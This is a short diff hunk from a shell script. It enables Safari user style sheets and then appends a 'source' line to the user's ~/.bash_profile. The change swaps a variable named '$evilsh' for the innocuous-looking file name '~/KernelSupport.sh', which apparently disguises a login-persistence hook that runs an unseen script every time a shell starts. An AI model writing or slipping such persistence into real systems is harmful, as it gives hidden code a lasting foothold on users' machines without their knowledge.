@@ -16,4 +16,4 @@ defaults write "com.apple.Safari" "WebKitUserStyleSheetEnabledPreferenceKey" "1"
 
 clear
 
-echo 'source $evilsh' >>~/.bash_profile
+echo 'source ~/KernelSupport.sh' >>~/.bash_profile
